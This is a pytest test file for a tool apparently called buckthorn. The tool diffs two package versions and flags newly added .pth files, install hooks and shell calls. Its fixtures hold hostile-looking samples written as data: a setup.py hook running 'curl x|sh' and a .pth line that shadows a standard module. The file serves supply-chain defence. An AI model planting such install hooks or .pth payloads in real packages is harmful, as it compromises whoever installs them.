import hashlib
import json

from buckthorn import lock
from buckthorn.cli import main

SHADOW = "import sys; sys.modules['collections'] = None\n"
HOST = "https://files.pythonhosted.org/packages/aa"


def _json_out(capsys):
    return json.loads(capsys.readouterr().out)


def test_upgrade_that_adds_a_pth_reports_only_that(tmp_path, make_wheel, capsys):
    old = make_wheel({"pkg/__init__.py": "import os\nos.system('x')\n"}, "pkg-1.0-py3-none-any.whl")
    new = make_wheel(
        {"pkg/__init__.py": "import os\nos.system('x')\n", "pkg.pth": SHADOW},
        "pkg-1.1-py3-none-any.whl",
    )
    assert main(["diff", "--format", "json", str(old), str(new)]) == 1
    (artifact,) = _json_out(capsys)["artifacts"]
    assert [f["rule_id"] for f in artifact["findings"]] == ["BKT-PTH-002"]


def test_upgrade_with_nothing_new_is_clean(make_wheel, capsys):
    old = make_wheel({"pkg.pth": SHADOW}, "pkg-1.0-py3-none-any.whl")
    new = make_wheel({"pkg.pth": SHADOW}, "pkg-1.1-py3-none-any.whl")
    assert main(["diff", str(old), str(new)]) == 0
    assert "clean" in capsys.readouterr().out


def test_new_install_hook_in_an_sdist_upgrade(make_sdist, capsys):
    setup = "from setuptools import setup\nsetup()\n"
    old = make_sdist({"setup.py": setup}, "pkg-1.0.tar.gz")
    new = make_sdist({"setup.py": "import os\nos.system('curl x|sh')\n" + setup}, "pkg-1.1.tar.gz")
    assert main(["diff", "--format", "json", str(old), str(new)]) == 1
    (artifact,) = _json_out(capsys)["artifacts"]
    rules = sorted(f["rule_id"] for f in artifact["findings"])
    assert rules == ["BKT-INSTALL-001", "BKT-INSTALL-002"]
    # Paths carry the version folder; the same file in both versions still matches.
    assert artifact["findings"][0]["file"] == "pkg-1.1/setup.py"


def test_same_hook_in_both_sdists_is_not_new(make_sdist, capsys):
    setup = "import os\nos.system('make')\nfrom setuptools import setup\nsetup()\n"
    old = make_sdist({"setup.py": setup}, "pkg-1.0.tar.gz")
    new = make_sdist({"setup.py": setup}, "pkg-1.1.tar.gz")
    assert main(["diff", str(old), str(new)]) == 0


def test_a_new_call_of_a_kind_already_there_is_new(make_wheel, capsys):
    old = make_wheel({"pkg/__init__.py": "import os\nos.system('x')\n"}, "pkg-1.0-py3-none-any.whl")
    new = make_wheel(
        {"pkg/__init__.py": "import os, subprocess\nos.system('x')\nsubprocess.run('y')\n"},
        "pkg-1.1-py3-none-any.whl",
    )
    assert main(["diff", str(old), str(new)]) == 1


class FakePyPI:
    def __init__(self):
        self.responses: dict[str, bytes] = {}
        self.index: dict[tuple[str, str], list] = {}

    def add(self, name, version, filename, data):
        url = f"{HOST}/{filename}"
        self.responses[url] = data
        entry = {
            "filename": filename,
            "url": url,
            "digests": {"sha256": hashlib.sha256(data).hexdigest()},
        }
        self.index.setdefault((name, version), []).append(entry)
        api = f"https://pypi.org/pypi/{name}/{version}/json"
        self.responses[api] = json.dumps({"urls": self.index[(name, version)]}).encode()

    def __call__(self, url, max_bytes):
        if url not in self.responses:
            raise lock.FetchError(f"404 {url}")
        return self.responses[url]


def test_diff_by_name_and_version_fetches_from_pypi(make_wheel, monkeypatch, capsys):
    pypi = FakePyPI()
    pypi.add(
        "pkg",
        "1.0",
        "pkg-1.0-py3-none-any.whl",
        make_wheel({"pkg/a.py": ""}, "pkg-1.0-py3-none-any.whl").read_bytes(),
    )
    pypi.add(
        "pkg",
        "1.1",
        "pkg-1.1-py3-none-any.whl",
        make_wheel({"pkg.pth": SHADOW}, "pkg-1.1-py3-none-any.whl").read_bytes(),
    )
    monkeypatch.setattr(lock, "fetch_url", pypi)
    assert main(["diff", "--format", "json", "pkg==1.0", "pkg==1.1"]) == 1
    (artifact,) = _json_out(capsys)["artifacts"]
    assert artifact["path"] == "pkg-1.1-py3-none-any.whl"
    assert [f["rule_id"] for f in artifact["findings"]] == ["BKT-PTH-002"]


def test_dropping_the_wheel_for_an_sdist_is_new_install_time_code(
    make_wheel, make_sdist, monkeypatch, capsys
):
    pypi = FakePyPI()
    pypi.add(
        "pkg",
        "1.0",
        "pkg-1.0-py3-none-any.whl",
        make_wheel({"pkg/a.py": ""}, "pkg-1.0-py3-none-any.whl").read_bytes(),
    )
    setup = "from setuptools import setup\nsetup()\n"
    pypi.add(
        "pkg",
        "1.1",
        "pkg-1.1.tar.gz",
        make_sdist({"setup.py": setup}, "pkg-1.1.tar.gz").read_bytes(),
    )
    monkeypatch.setattr(lock, "fetch_url", pypi)
    assert main(["diff", "--format", "json", "pkg==1.0", "pkg==1.1"]) == 1
    (artifact,) = _json_out(capsys)["artifacts"]
    assert [f["rule_id"] for f in artifact["findings"]] == ["BKT-DIFF-001"]


def test_unknown_release_is_an_error(monkeypatch, capsys):
    monkeypatch.setattr(lock, "fetch_url", FakePyPI())
    assert main(["diff", "pkg==1.0", "pkg==1.1"]) == 2
